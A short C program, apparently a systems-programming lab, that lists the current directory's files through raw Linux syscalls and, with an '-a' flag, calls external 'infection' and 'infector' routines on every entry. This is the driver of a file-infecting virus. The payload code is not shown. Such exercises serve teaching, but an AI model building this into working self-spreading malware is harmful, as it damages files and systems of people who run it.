#include "util.h"
#define STDERR 2
#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_CLOSE 6
#define SYS_OPEN 5
#define SYS_EXIT 1
#define SYS_LSEEK 19
#define SYS_GETDENTS 141
#define STDIN 0
#define STDOUT 1
#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 64
#define DT_BLK 6 /*block dev*/
#define DT_CHR 2 /*char dev*/
#define DT_DIR 4 /*directory*/
#define DT_FIFO 1/*FIFO*/
#define DT_LNK 10 /*symlink*/
#define DT_SOCK 12 /*socket*/
#define DT_REG 8 /*regular*/
#define DT_UNKNOWN 0 /*????*/

extern int system_call();
extern void infection();
extern void infector(char*);


typedef struct dirent{
    int d_in;
    int off;
    short len;
    char name[];
} dirent;

int main (int argc , char* argv[], char* envp[]) {
    char buffer[8192],data_type,prefix='\n';
    int range,file,infct=0;
    dirent* dirent_value;
    file=system_call(SYS_OPEN, ".", O_RDONLY, 0644);
    range= system_call(SYS_GETDENTS, file, &buffer, 8192);
    int j=0 ;
    for(;j<argc;j++){
        if(strncmp(argv[j],"-a",2)==0){
            prefix=(argv[j]+2)[0];
            infct=1;
            infection();
        }
    }
    j=0;
    while(j<range){
        dirent_value=(dirent*)(buffer+j); 
        data_type=*(buffer+j+dirent_value->len-1);
       
        if (data_type==DT_REG) {
        if((prefix=='\n'||prefix==dirent_value->name[0])){
            system_call(SYS_WRITE, STDOUT, dirent_value->name, strlen(dirent_value->name));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        }
        if(infct==1)
        {
            infector(dirent_value->name);
        }
        j=j+dirent_value->len;
    }
    system_call(SYS_CLOSE,file);
    return 0;
}